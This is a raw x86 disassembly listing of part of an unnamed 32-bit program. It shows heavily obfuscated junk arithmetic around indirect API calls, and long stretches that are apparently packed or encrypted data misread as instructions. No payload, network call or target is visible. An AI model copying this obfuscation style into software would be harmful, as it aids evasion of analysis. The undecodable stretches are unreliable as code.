  40b331:	add    BYTE PTR [eax],al
  40b333:	mov    esi,DWORD PTR [ebp-0x1c]
  40b336:	sbb    DWORD PTR ds:0x42820b,0x4282cb
  40b340:	push   0x5f43
  40b345:	or     edx,0x69b4
  40b34b:	sub    DWORD PTR ds:0x428363,0x4282cb
  40b355:	push   0x1657
  40b35a:	xor    DWORD PTR ds:0x42834b,0x42823f
  40b364:	or     eax,0x528b
  40b369:	xor    edx,esi
  40b36b:	xor    eax,ecx
  40b36d:	sub    DWORD PTR ds:0x42837f,0x42821f
  40b377:	push   edx
  40b378:	push   eax
  40b379:	call   0x416c20
  40b37e:	xor    ecx,ecx
  40b380:	or     ecx,DWORD PTR ds:0x42827f
  40b386:	adc    DWORD PTR ds:0x428173,ecx
  40b38c:	mov    ecx,DWORD PTR [ebp-0x28]
  40b38f:	xor    DWORD PTR ds:0x4282e7,ecx
  40b395:	mov    esi,DWORD PTR [ebp-0x24]
  40b398:	and    DWORD PTR ds:0x428253,0x42823f
  40b3a2:	push   esi
  40b3a3:	add    DWORD PTR ds:0x42814b,0x5412
  40b3ad:	push   ecx
  40b3ae:	sub    DWORD PTR ds:0x428367,0x27f7
  40b3b8:	push   edx
  40b3b9:	push   eax
  40b3ba:	sub    DWORD PTR ds:0x428147,0x42837b
  40b3c4:	call   0x422049
  40b3c9:	mov    DWORD PTR [ebp-0x30],eax
  40b3cc:	add    eax,DWORD PTR ds:0x42824b
  40b3d2:	mov    DWORD PTR [ebp-0x2c],edx
  40b3d5:	cmp    DWORD PTR ds:0x42827b,0x0
  40b3dc:	not    esi
  40b3de:	mov    DWORD PTR ds:0x428263,0x6e42
  40b3e8:	jmp    0x40b4a9
  40b3ed:	not    DWORD PTR ds:0x4282fb
  40b3f3:	mov    eax,ds:0x428273
  40b3f8:	cmp    DWORD PTR ds:0x42827b,0x0
  40b3ff:	jl     0x40b428
  40b405:	push   0x2496
  40b40a:	push   DWORD PTR [ebp-0x28]
  40b40d:	call   DWORD PTR ds:0x428ebc
  40b413:	xor    edx,ecx
  40b415:	and    DWORD PTR ds:0x42816b,edx
  40b41b:	movzx  ecx,WORD PTR ds:0x42825b
  40b422:	or     DWORD PTR ds:0x4282eb,ecx
  40b428:	add    esi,edx
  40b42a:	adc    DWORD PTR ds:0x428147,0x1bfc
  40b434:	sub    esi,0x4a2f
  40b43a:	cmp    DWORD PTR ds:0x428373,0x0
  40b441:	mov    DWORD PTR ds:0x4282eb,ecx
  40b447:	mov    DWORD PTR ds:0x42836b,0x318c
  40b451:	mov    DWORD PTR ds:0x42837b,0x431a
  40b45b:	jmp    0x40b4a9
  40b460:	mov    DWORD PTR ds:0x428243,0x461b
  40b46a:	mov    DWORD PTR ds:0x42827f,0x63d9
  40b474:	cmp    DWORD PTR ds:0x428373,0x0
  40b47b:	jbe    0x40b49b
  40b481:	push   DWORD PTR [ebp-0x1c]
  40b484:	push   0x184b
  40b489:	call   DWORD PTR ds:0x428ec0
  40b48f:	xor    edx,DWORD PTR ds:0x428253
  40b495:	adc    ecx,DWORD PTR ds:0x42835b
  40b49b:	and    DWORD PTR ds:0x42814b,0x404c
  40b4a5:	and    edx,esi
  40b4a7:	add    ecx,edx
  40b4a9:	mov    DWORD PTR [ebp-0x10],0x5fa8
  40b4b0:	movzx  eax,WORD PTR ds:0x42825f
  40b4b7:	xor    DWORD PTR ds:0x428373,eax
  40b4bd:	mov    DWORD PTR [ebp-0xc],0x1751
  40b4c4:	dec    DWORD PTR ds:0x428243
  40b4ca:	mov    DWORD PTR [ebp-0x20],0x5e90
  40b4d1:	mov    DWORD PTR [ebp-0x1c],0xfc1
  40b4d8:	cmp    DWORD PTR ds:0x42815f,0x0
  40b4df:	mov    edx,0x29d6
  40b4e4:	mov    ecx,0x5377
  40b4e9:	not    esi
  40b4eb:	movzx  ecx,BYTE PTR ds:0x42813b
  40b4f2:	jmp    0x40b54e
  40b4f7:	mov    DWORD PTR ds:0x42820b,0x9f5
  40b501:	mov    DWORD PTR ds:0x428287,0x1c35
  40b50b:	cmp    DWORD PTR ds:0x42815f,0x0
  40b512:	je     0x40b542
  40b518:	push   0x427fb3
  40b51d:	push   0x400000
  40b522:	call   DWORD PTR ds:0x428da8
  40b528:	sbb    DWORD PTR ds:0x428277,edi
  40b52e:	mov    ecx,DWORD PTR ds:0x4281af
  40b534:	xor    edx,edx
  40b536:	or     edx,DWORD PTR ds:0x42839b
  40b53c:	sub    ecx,edx
  40b53e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40b542:	and    esi,DWORD PTR ds:0x42817b
  40b548:	sbb    esi,0x2386
  40b54e:	mov    DWORD PTR [ebp-0x28],0x7044
  40b555:	mov    DWORD PTR [ebp-0x24],0x7bf
  40b55c:	mov    eax,DWORD PTR [ebp-0x28]
  40b55f:	sbb    edx,DWORD PTR ds:0x428223
  40b565:	mov    ecx,DWORD PTR [ebp-0x24]
  40b568:	not    DWORD PTR ds:0x428253
  40b56e:	mov    edx,DWORD PTR [ebp-0x20]
  40b571:	or     DWORD PTR ds:0x428283,ecx
  40b577:	mov    esi,DWORD PTR [ebp-0x1c]
  40b57a:	sbb    DWORD PTR ds:0x42835b,0x428223
  40b584:	jmp    0x40b97a
  40b589:	adc    DWORD PTR [edx+0x10],esi
  40b58c:	packssdw mm5,QWORD PTR [edx+0xf]
  40b590:	jb     0x40b5e9
  40b592:	jnp    0x40b598
  40b594:	push   0xffffffe6
  40b596:	sbb    DWORD PTR [edi],esp
  40b598:	stos   BYTE PTR es:[edi],al
  40b599:	or     dl,BYTE PTR [ebx]
  40b59b:	sbb    BYTE PTR [eax],bl
  40b59d:	outs   dx,BYTE PTR ds:[esi]
  40b59e:	adc    bl,BYTE PTR [eax]
  40b5a0:	sbb    BYTE PTR [eax+0x1d2758e0],cl
  40b5a6:	mov    ah,0xc8
  40b5a8:	in     al,dx
  40b5a9:	out    0xb0,eax
  40b5ab:	fwait
  40b5ac:	adc    edi,ebp
  40b5ae:	jmp    0x560c:0x2154fdad
  40b5b5:	mov    dl,0x3b
  40b5b7:	shl    BYTE PTR [esi-0x15],1
  40b5ba:	mov    ecx,0x35c8d749
  40b5bf:	rol    DWORD PTR [ecx],cl
  40b5c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5c2:	popa   
  40b5c3:	and    dl,bh
  40b5c5:	aas    
  40b5c6:	in     eax,dx
  40b5c7:	sub    DWORD PTR [eax+0x93d1a53],0xffffffe6
  40b5ce:	and    al,0x47
  40b5d0:	push   eax
  40b5d1:	jp     0x40b640
  40b5d3:	inc    esi
  40b5d4:	cmp    eax,0xeebbce6d
  40b5d9:	and    esi,ebx
  40b5db:	sbb    esi,ebx
  40b5dd:	test   al,0xd5
  40b5df:	dec    edx
  40b5e0:	xchg   esi,eax
  40b5e1:	push   esi
  40b5e2:	hlt    
  40b5e3:	add    esi,esp
  40b5e5:	xchg   edx,eax
  40b5e6:	(bad)  
  40b5e7:	loope  0x40b62d
  40b5e9:	addr16 mov eax,0x7b0c9d18
  40b5ef:	imul   ecx,DWORD PTR [edx+0x63],0xffffffb1
  40b5f3:	imul   edx,eax,0x9be3ab98
  40b5f9:	xor    ch,BYTE PTR [esi-0x2811e1e]
  40b5ff:	(bad)  
  40b600:	lods   eax,DWORD PTR ds:[esi]
  40b601:	mov    esp,0xfc88f419
  40b607:	ins    DWORD PTR es:[edi],dx
  40b608:	xor    BYTE PTR [esi-0x169cf823],dl
  40b60e:	push   edi
  40b60f:	(bad)  
  40b610:	xor    DWORD PTR [edx-0x598804e1],esp
  40b616:	sub    dl,al
  40b618:	sbb    DWORD PTR [ebp-0x3752ce62],0x49f3a819
  40b622:	imul   ebp,edi,0x3f3fe59f
  40b628:	mov    eax,0xd1d936cb
  40b62d:	iret   
  40b62e:	mov    esp,DWORD PTR [eax+ebp*2]
  40b631:	cmp    DWORD PTR [eax+0x2331d8de],edi
  40b637:	bound  ecx,QWORD PTR [edx-0x641b96e0]
  40b63d:	lods   al,BYTE PTR ds:[esi]
  40b63e:	shl    BYTE PTR [edx-0x62],1
  40b641:	mov    dl,0xf
  40b643:	int    0x21
  40b645:	ficom  WORD PTR [ebx-0x17d88cfe]
  40b64b:	or     edi,DWORD PTR [edx]
  40b64d:	loope  0x40b6a2
  40b64f:	cld    
  40b650:	sub    eax,0x5f74ab9c
  40b655:	iret   
  40b656:	lock imul esp,DWORD PTR [ebx+0x6e9c1e3c],0x25
  40b65e:	mov    ds:0xae0c5313,al
  40b663:	sbb    BYTE PTR [ecx-0x3e],bh
  40b666:	mov    ebp,0x792908f0
  40b66b:	das    
  40b66c:	sub    eax,0x26ef8e44
  40b671:	sbb    al,0x73
  40b673:	xchg   edx,eax
  40b674:	mov    dh,0x5e
  40b676:	fidiv  DWORD PTR [edi+eiz*4]
  40b679:	(bad)  
  40b67a:	fcmovnu st,st(4)
  40b67c:	ins    BYTE PTR es:[edi],dx
  40b67d:	fcmovnb st,st(1)
  40b67f:	mov    ecx,0x43896ac3
  40b684:	sbb    ch,BYTE PTR [edx]
  40b686:	mov    dl,0xf5
  40b688:	mov    al,ds:0xed3ada08
  40b68d:	pop    ecx
  40b68e:	(bad)  
  40b68f:	mov    ds:0xc248aeb,eax
  40b694:	sub    eax,0x1347230d
  40b699:	pop    es
  40b69a:	leave  
  40b69b:	std    
  40b69c:	ficom  DWORD PTR [esi-0x4a]
  40b69f:	adc    eax,0x222c1e10
  40b6a4:	mov    cl,0xfc
  40b6a6:	and    dh,BYTE PTR [edx-0x64]
  40b6a9:	mov    cl,0x5f
  40b6ab:	dec    edx
  40b6ac:	adc    cl,bl
  40b6ae:	mov    ds:0x34039096,al
  40b6b3:	pop    esp
  40b6b4:	push   es
  40b6b5:	push   ecx
  40b6b6:	ins    DWORD PTR es:[edi],dx
  40b6b7:	mov    ch,0xe
  40b6b9:	mov    ds:0xf9eb6720,al
  40b6be:	out    dx,al
  40b6bf:	sbb    eax,0xcd32ec2e
  40b6c4:	outs   dx,BYTE PTR ds:[esi]
  40b6c5:	sub    al,0xd
  40b6c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6c8:	dec    ebx
  40b6c9:	fidivr DWORD PTR [ebx-0x7e03243d]
  40b6cf:	jnp    0x40b725
  40b6d1:	jne    0x40b74d
  40b6d3:	mov    ebp,0x14dab136
  40b6d8:	out    dx,eax
  40b6d9:	(bad)  
  40b6da:	rcr    ch,0x8f
  40b6dd:	ins    BYTE PTR es:[edi],dx
  40b6de:	fcomp  QWORD PTR [edx]
  40b6e0:	(bad)  
  40b6e1:	pop    edi
  40b6e2:	dec    ebx
  40b6e3:	xchg   esp,eax
  40b6e4:	cwde   
  40b6e5:	in     al,dx
  40b6e6:	xlat   BYTE PTR ds:[ebx]
  40b6e7:	popf   
  40b6e8:	fld    QWORD PTR [edx]
  40b6ea:	jo     0x40b724
  40b6ec:	inc    edx
  40b6ed:	aam    0x2e
  40b6ef:	jo     0x40b71a
  40b6f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6f2:	cmp    edx,0xe666fcdd
  40b6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6f9:	out    dx,al
  40b6fa:	or     ah,0x68
  40b6fd:	pop    ds
  40b6fe:	arpl   bp,sp
  40b700:	cmc    
  40b701:	call   0x560f26df
  40b706:	cmp    al,ch
  40b708:	and    esp,eax
  40b70a:	xlat   BYTE PTR ds:[ebx]
  40b70b:	mov    ah,0xa4
  40b70d:	sahf   
  40b70e:	xor    eax,0x5e3fad64
  40b713:	in     al,dx
  40b714:	not    BYTE PTR [esi+0x488b104b]
  40b71a:	sbb    ah,BYTE PTR [ecx]
  40b71c:	in     eax,0xae
  40b71e:	xor    eax,0x138710ac
  40b723:	sub    edx,ecx
  40b725:	test   BYTE PTR [ebp+0x3a],ah
  40b728:	iret   
  40b729:	mov    eax,ds:0xb831f031
  40b72e:	mov    ebp,0x636c5948
  40b733:	xor    DWORD PTR [ebx],0x5f582237
  40b739:	fst    st(3)
  40b73b:	inc    ecx
  40b73c:	jl     0x40b6e6
  40b73e:	ds imul ebx,esi,0x697427b6
  40b745:	adc    al,0x72
  40b747:	cmp    DWORD PTR [esi+0x39fac0cf],esi
  40b74d:	sbb    cl,BYTE PTR [edx-0x2e]
  40b750:	fwait
  40b751:	out    dx,eax
  40b752:	jle    0x40b721
  40b754:	xchg   edi,eax
  40b755:	xchg   ecx,eax
  40b756:	xchg   ebp,eax
  40b757:	ror    eax,0xf0
  40b75a:	or     al,BYTE PTR [edi]
  40b75c:	popf   
  40b75d:	jmp    0x40b706
  40b75f:	xor    al,0xa1
  40b761:	into   
  40b762:	xchg   ebx,eax
  40b763:	in     al,0x58
  40b765:	icebp  
  40b766:	cmp    al,0xf8
  40b768:	shl    edx,cl
  40b76a:	cld    
  40b76b:	add    ecx,eax
  40b76d:	js     0x40b748
  40b76f:	or     eax,0xce727ca2
  40b774:	jl     0x40b7b4
  40b776:	mov    ds:0x2b762249,eax
  40b77b:	sbb    cl,BYTE PTR [eax+eax*8-0x34d6993c]
  40b782:	mov    DWORD PTR [eax-0x5940395e],ebp
  40b788:	gs add al,0xb
  40b78b:	push   ss
  40b78c:	sar    BYTE PTR [esi-0x73],0x39
  40b790:	les    edx,FWORD PTR [eax-0x4f]
  40b793:	pop    ss
  40b794:	xchg   ebp,eax
  40b795:	inc    ebx
  40b796:	mov    al,ds:0xfa40db0e
  40b79b:	clc    
  40b79c:	sub    dl,BYTE PTR [esi-0x11a64c5e]
  40b7a2:	xor    al,0xeb
  40b7a4:	and    dl,BYTE PTR [edx]
  40b7a6:	scas   al,BYTE PTR es:[edi]
  40b7a7:	mov    eax,0x6064c73a
  40b7ac:	lds    ebx,FWORD PTR [ebp-0x52530ccc]
  40b7b2:	popa   
  40b7b3:	jae    0x40b75a
  40b7b5:	out    dx,al
  40b7b6:	xchg   esp,eax
  40b7b7:	shl    DWORD PTR [edx-0x8],cl
  40b7ba:	mov    bh,0x71
  40b7bc:	push   esi
  40b7bd:	inc    ecx
  40b7be:	mov    ch,BYTE PTR ds:0x32360693
  40b7c4:	mov    DWORD PTR [esi+eiz*1-0x4f],ecx
  40b7c8:	sbb    ecx,DWORD PTR [ebp+ecx*1+0x6c4a5e59]
  40b7cf:	pop    esi
  40b7d0:	loopne 0x40b790
  40b7d2:	std    
  40b7d3:	jae    0x40b7b2
  40b7d5:	call   0x9657:0x9cdfe7a9
  40b7dc:	popf   
  40b7dd:	cmp    cl,BYTE PTR [edi+0x6c]
  40b7e0:	imul   eax,DWORD PTR [eax+edx*8-0x3f],0x6a
  40b7e5:	mov    dl,0xf6
  40b7e7:	pop    ebp
  40b7e8:	mov    ds:0x73057613,al
  40b7ed:	scas   al,BYTE PTR es:[edi]
  40b7ee:	jbe    0x40b7d4
  40b7f0:	mov    ds:0x7c56174d,eax
  40b7f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7f6:	cmc    
  40b7f7:	push   esp
  40b7f8:	jle    0x40b856
  40b7fa:	inc    ecx
  40b7fb:	lock loope 0x40b78d
  40b7fe:	xor    bl,dl
  40b800:	jo     0x40b7da
  40b802:	(bad)  
  40b803:	jmp    0xb822a5e5
  40b808:	and    eax,0xe1f439ba
  40b80d:	rol    DWORD PTR ds:0xe163abf5,0xc8
  40b814:	fwait
  40b815:	pop    es
  40b816:	cmp    cl,BYTE PTR [eax+ebp*2]
  40b819:	rcl    DWORD PTR [esi+eiz*2-0x6a],0x78
  40b81e:	arpl   WORD PTR [esi+ebx*4-0x631d9012],di
  40b825:	push   ecx
  40b826:	pusha  
  40b827:	jle    0x40b828
  40b829:	pop    ds
  40b82a:	push   esi
  40b82b:	test   al,0x61
  40b82d:	xchg   esp,eax
  40b82e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b82f:	mov    cl,0xc9
  40b831:	mov    al,0x71
  40b833:	rcl    DWORD PTR [ecx],cl
  40b835:	mov    cl,0xb2
  40b837:	iret   
  40b838:	inc    ebx
  40b839:	mov    BYTE PTR [eax],0x49
  40b83c:	data16 xor BYTE PTR [eax],ch
  40b83f:	std    
  40b840:	scas   eax,DWORD PTR es:[edi]
  40b841:	int    0x23
  40b843:	adc    DWORD PTR [esi],eax
  40b845:	ds push esi
  40b847:	add    DWORD PTR [ecx-0x42],ecx
  40b84a:	xchg   esp,eax
  40b84b:	call   0xea32:0x157c9f81
  40b852:	ficom  WORD PTR [edi+eiz*8]
  40b855:	xlat   BYTE PTR ds:[ebx]
  40b856:	call   0x28a4f9de
  40b85b:	ret    
  40b85c:	pop    edi
  40b85d:	add    BYTE PTR [ebp-0x6],0xa9
  40b861:	(bad)  
  40b862:	cli    
  40b863:	sbb    eax,0x6b92f1d
  40b868:	call   0xda014e6a
  40b86d:	jb     0x40b8d6
  40b86f:	cmp    bl,bh
  40b871:	pusha  
  40b872:	fidiv  DWORD PTR [ebp-0x611b8250]
  40b878:	inc    eax
  40b879:	xchg   ebx,eax
  40b87a:	sbb    al,0x60
  40b87c:	xor    eax,0x51a7a1a
  40b881:	or     al,0x54
  40b883:	push   esp
  40b884:	xor    DWORD PTR [edi+edi*8],0xede9349e
  40b88b:	call   0xd28e:0xcee5b9c5
  40b892:	scas   al,BYTE PTR es:[edi]
  40b893:	jae    0x40b888
  40b895:	repnz sub BYTE PTR [edi-0x3a],bl
  40b899:	mov    ecx,0xf16c215e
  40b89e:	popa   
  40b89f:	lahf   
  40b8a0:	xchg   ecx,eax
  40b8a1:	jmp    0x40b8f6
  40b8a3:	in     al,dx
  40b8a4:	repz and ebp,esp
  40b8a7:	mov    bl,0x5f
  40b8a9:	lods   al,BYTE PTR es:[esi]
  40b8ab:	aas    
  40b8ac:	in     al,dx
  40b8ad:	test   DWORD PTR [esi-0x169b2969],ecx
  40b8b3:	push   edi
  40b8b4:	and    edi,esi
  40b8b6:	mov    fs,WORD PTR [edi+0x55]
  40b8b9:	pop    esi
  40b8ba:	inc    esp
  40b8bb:	pop    es
  40b8bc:	xor    ebx,DWORD PTR [ebx+0x5c]
  40b8bf:	inc    ecx
  40b8c0:	sub    eax,0xe6af9469
  40b8c5:	ds pop ecx
  40b8c7:	pop    esi
  40b8c8:	call   0xb1ff34d1
  40b8cd:	lods   al,BYTE PTR ds:[esi]
  40b8ce:	xchg   esp,eax
  40b8cf:	fmulp  st(7),st
  40b8d1:	test   ebp,eax
  40b8d3:	xor    BYTE PTR [ecx+0x26],dl
  40b8d6:	mov    eax,ds:0x323ff8a9
  40b8db:	clc    
  40b8dc:	mov    dl,al
  40b8de:	(bad)  
  40b8df:	and    DWORD PTR [esi+0x70b6a97e],ecx
  40b8e5:	pop    ecx
  40b8e6:	icebp  
  40b8e7:	out    dx,al
  40b8e8:	cmp    eax,0x7ff724b9
  40b8ed:	inc    esp
  40b8ee:	xor    al,0x33
  40b8f0:	mov    eax,0xcc95f622
  40b8f5:	fstp   QWORD PTR [edx]
  40b8f7:	push   esp
  40b8f8:	out    dx,eax
  40b8f9:	push   eax
  40b8fa:	mov    dh,0x96
  40b8fc:	xchg   ebx,eax
  40b8fd:	or     DWORD PTR ds:0x7f027d7a,0xffffffb1
  40b904:	sub    DWORD PTR [edx+0x50bcf688],esi
  40b90a:	add    dl,dh
  40b90c:	xor    BYTE PTR [ebx+0xa],0xc8
  40b910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b911:	pushw  es
  40b913:	out    dx,al
  40b914:	aad    0x82
  40b916:	ins    DWORD PTR es:[edi],dx
  40b917:	add    BYTE PTR [edx+0x22],cl
  40b91a:	mov    ebp,DWORD PTR [esp+edx*4-0x2f40ac31]
  40b921:	mov    cl,0x45
  40b923:	adc    al,BYTE PTR [ecx]
  40b925:	stos   DWORD PTR es:[edi],eax
  40b926:	cmp    eax,0x9f50e15c
  40b92b:	mov    eax,ds:0x12fda949
  40b930:	xchg   ebx,eax
  40b931:	aam    0xeb
  40b933:	sub    al,0x77
  40b935:	hlt    
  40b936:	(bad)  
  40b937:	test   eax,0x7127e922
  40b93c:	(bad)  
  40b93d:	jbe    0x40b949
  40b93f:	adc    ecx,eax
  40b941:	mov    BYTE PTR [edx+0x30ba99ce],ah
  40b947:	ins    DWORD PTR es:[edi],dx
  40b948:	cmp    edi,DWORD PTR [ebp+0x46]
  40b94b:	adc    ecx,DWORD PTR [edi]
  40b94d:	lea    edi,[ebp-0x32]
  40b950:	scas   al,BYTE PTR es:[edi]
  40b951:	xlat   BYTE PTR ds:[ebx]
  40b952:	lea    eax,[esp+edi*4+0x38]
  40b956:	push   esp
  40b957:	xor    DWORD PTR [edx],edx
  40b959:	push   ebx
  40b95a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95b:	lods   eax,DWORD PTR ds:[esi]
  40b95c:	test   DWORD PTR es:[ecx],0xe4713c19
  40b963:	scas   al,BYTE PTR es:[edi]
  40b964:	pop    ss
  40b965:	jb     0x40b9af
  40b967:	mov    dl,0x73
  40b969:	push   edi
  40b96a:	pop    esi
  40b96b:	xor    BYTE PTR [ebp-0x4f],0x64
  40b96f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b970:	cmp    ebp,edi
  40b972:	pop    ebp
  40b973:	add    eax,0x71f557d6
  40b978:	ror    BYTE PTR [ecx+0x355c05],cl
  40b97e:	add    BYTE PTR [ecx+0x819d1],al
  40b984:	add    BYTE PTR [ecx+0x4282d315],al
  40b98a:	add    BYTE PTR ds:0xb00000c,bl
  40b990:	ret    0x558b
  40b993:	lock or ecx,esi
  40b996:	and    esi,DWORD PTR ds:0x428257
  40b99c:	mov    esi,DWORD PTR [ebp-0xc]
  40b99f:	and    DWORD PTR ds:0x4282e7,0x1cd5
  40b9a9:	or     eax,edx
  40b9ab:	cmp    DWORD PTR ds:0x4282ef,0x0
  40b9b2:	mov    edx,0xd4e
  40b9b7:	not    edx
  40b9b9:	mov    DWORD PTR ds:0x428257,0x1f80
  40b9c3:	jmp    0x40ba42
  40b9c8:	mov    DWORD PTR ds:0x4282ef,0x2492
  40b9d2:	mov    DWORD PTR ds:0x42837f,0xa5a
  40b9dc:	cmp    DWORD PTR ds:0x4282ef,0x0
  40b9e3:	jbe    0x40ba20
  40b9e9:	push   DWORD PTR [ebp-0x1c]
  40b9ec:	push   0x148d
  40b9f1:	call   DWORD PTR ds:0x428dac
  40b9f7:	adc    DWORD PTR ds:0x42837b,0x175a
  40ba01:	not    edx
  40ba03:	movzx  edx,WORD PTR ds:0x4282d7
  40ba0a:	sub    edx,DWORD PTR ds:0x4282eb
  40ba10:	mov    DWORD PTR ds:0x4282d7,edx
  40ba16:	adc    DWORD PTR ds:0x4282d3,0x62d2
  40ba20:	mov    edx,DWORD PTR ds:0x428147
  40ba26:	xor    DWORD PTR ds:0x428373,edx
  40ba2c:	or     DWORD PTR ds:0x42821f,0x5c0
  40ba36:	mov    edx,DWORD PTR ds:0x428257
  40ba3c:	or     DWORD PTR ds:0x4282f3,edx
  40ba42:	mov    edx,DWORD PTR [ebp-0x30]
  40ba45:	or     ecx,esi
  40ba47:	mov    esi,DWORD PTR [ebp-0x2c]
  40ba4a:	or     eax,0xf34
  40ba4f:	or     ecx,0x6c90
  40ba55:	cmp    edx,eax
  40ba57:	jne    0x40ba65
  40ba5d:	cmp    esi,ecx
  40ba5f:	je     0x40cc06
  40ba65:	mov    DWORD PTR [ebp-0x30],0x5ddc
  40ba6c:	mov    DWORD PTR [ebp-0x2c],0x7433
  40ba73:	mov    eax,DWORD PTR [ebp-0x30]
  40ba76:	mov    ecx,DWORD PTR [ebp-0x2c]
  40ba79:	xor    ecx,0xfffffd1f
  40ba7f:	xor    eax,0xffff9fff
  40ba84:	and    ecx,0x6e0
  40ba8a:	and    eax,0x6244
  40ba8f:	mov    DWORD PTR [ebp-0x10],eax
  40ba92:	jmp    0x40be88
  40ba97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba99:	test   al,0x41
  40ba9b:	test   al,0x3d
  40ba9d:	sbb    al,0x1c
  40ba9f:	fdiv   QWORD PTR [edx]
  40baa1:	mov    bl,0x7c
  40baa3:	and    DWORD PTR ds:0xd607edd,eax
  40baa9:	sbb    BYTE PTR [eax],bl
  40baab:	outs   dx,BYTE PTR ds:[esi]
  40baac:	adc    bl,BYTE PTR [eax]
  40baae:	sbb    BYTE PTR [edi-0x56],bl
  40bab1:	and    ecx,edi
  40bab3:	popa   
  40bab4:	jp     0x40bac7
  40bab6:	adc    cl,BYTE PTR [esi+esi*2-0x57456d7a]
  40babd:	jg     0x40baf0
  40babf:	sub    eax,0x6b7cda82
  40bac4:	mov    ds:0x3c254351,eax
  40bac9:	std    
  40baca:	jnp    0x40bae0
  40bacc:	xor    dh,BYTE PTR [ebx-0x19]
  40bacf:	cdq    
  40bad0:	iret   
  40bad1:	cmp    ch,BYTE PTR [eax-0x46c0fb7a]
  40bad7:	les    esp,FWORD PTR [ecx]
  40bad9:	aas    
  40bada:	pop    ds
  40badb:	imul   esp,DWORD PTR [ebx+0x2c5d290c],0x17badd5a
  40bae5:	test   al,0xd1
  40bae7:	adc    al,0x8
  40bae9:	fs aas 
  40baeb:	cmc    
  40baec:	leave  
  40baed:	out    0xaa,eax
  40baef:	(bad)
  40baf2:	jo     0x40bb09
  40baf4:	or     BYTE PTR [esi+0x264661fd],al
  40bafa:	adc    eax,0x1cb3a614
  40baff:	out    dx,eax
  40bb00:	jnp    0x40badb
  40bb02:	jno    0x40bab7
  40bb04:	push   ds
  40bb05:	add    ch,BYTE PTR [ecx+ebp*1]
  40bb08:	fidiv  DWORD PTR [eax+0x6d4c5dac]
  40bb0e:	les    esi,FWORD PTR [esp+esi*1]
  40bb11:	mov    DWORD PTR [esi],ecx
  40bb13:	fisttp DWORD PTR [ecx]
  40bb15:	push   ss
  40bb16:	add    dl,BYTE PTR [eax]
  40bb18:	aas    
  40bb19:	fwait
  40bb1a:	cwde   
  40bb1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb1c:	addr16 jp 0x40bb84
  40bb1f:	call   0xc863:0xffb80f28
  40bb26:	mov    ch,0x3a
  40bb28:	test   ebp,esp
  40bb2a:	mov    dl,0x9f
  40bb2c:	cmc    
  40bb2d:	out    0x3,al
  40bb2f:	jecxz  0x40bb38
  40bb31:	xchg   ebx,eax
  40bb32:	sub    esp,DWORD PTR [ebx+0x4951293f]
  40bb38:	adc    al,0x93
  40bb3a:	mov    edi,0x3e457766
  40bb3f:	dec    ebx
  40bb40:	adc    BYTE PTR [edx],0x63
  40bb43:	stos   DWORD PTR es:[edi],eax
  40bb44:	pop    ecx
  40bb45:	dec    ch
  40bb47:	adc    eax,0xf0819a68
  40bb4c:	jb     0x40bbc3
  40bb4e:	ret    
  40bb4f:	imul   ebp,DWORD PTR [ecx+0x45],0x41
  40bb53:	inc    esp
  40bb54:	jb     0x40bb86
  40bb56:	cli    
  40bb57:	pop    esi
  40bb58:	xor    esp,edi
  40bb5a:	xor    dl,ah
  40bb5c:	pop    edx
  40bb5d:	jle    0x40bb49
  40bb5f:	cmp    eax,0xb0e5ea94
  40bb64:	ror    DWORD PTR [ecx],0xf2
  40bb67:	sti    
  40bb68:	xor    al,0xe4
  40bb6a:	test   bl,dl
  40bb6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb6d:	scas   al,BYTE PTR es:[edi]
  40bb6e:	cmp    DWORD PTR [esp+ecx*2-0x2ce5f303],ebx
  40bb75:	aas    
  40bb76:	mov    ch,0x94
  40bb78:	push   eax
  40bb79:	xchg   edx,eax
  40bb7a:	jns    0x40bbf1
  40bb7c:	mov    ds:0xa11c9d50,eax
  40bb81:	mov    ebp,0x2194c7ee
  40bb86:	call   0xff1e:0xe0d86f18
  40bb8d:	dec    eax
  40bb8e:	mov    DWORD PTR ds:0x5f27596a,eax
  40bb94:	push   ecx
  40bb95:	inc    ecx
  40bb96:	mov    ah,0xef
  40bb98:	paddw  mm4,QWORD PTR [eax+0x53]
  40bb9c:	gs pusha 
  40bb9e:	pcmpeqb mm6,QWORD PTR gs:[esi]
  40bba2:	mov    bh,0xb1
  40bba4:	jmp    0x40bbbf
  40bba6:	pushf  
  40bba7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bba8:	pop    esp
  40bba9:	hlt    
  40bbaa:	jg     0x40bbe7
  40bbac:	dec    esp
  40bbad:	(bad)  
  40bbae:	push   ds
  40bbaf:	aas    
  40bbb0:	stc    
  40bbb1:	pop    ebp
  40bbb2:	inc    ecx
  40bbb3:	sar    dl,1
  40bbb5:	repnz cli 
  40bbb7:	std    
  40bbb8:	pop    ss
  40bbb9:	mov    DWORD PTR [edi+0x29b8c02e],ebx
  40bbbf:	sub    DWORD PTR [edx+0x45909e95],edi
  40bbc5:	jns    0x40bbd6
  40bbc7:	cmp    ebp,DWORD PTR [ebx+0x6a]
  40bbca:	call   0xd180:0x47a85f00
  40bbd1:	push   eax
  40bbd2:	inc    ecx
  40bbd3:	xor    cl,ah
  40bbd5:	retf   
  40bbd6:	in     al,dx
  40bbd7:	add    al,0xb5
  40bbd9:	xor    al,dl
  40bbdb:	retf   
  40bbdc:	lahf   
  40bbdd:	pop    ecx
  40bbde:	fistp  WORD PTR [ecx]
  40bbe0:	icebp  
  40bbe1:	std    
  40bbe2:	push   cs
  40bbe3:	fdiv   DWORD PTR [edx+0x6e5412c2]
  40bbe9:	and    BYTE PTR [ebx+ebp*4],0xde
  40bbed:	xor    DWORD PTR [eax],esi
  40bbef:	jmp    0x182f:0x4047e6ad
  40bbf6:	pop    ss
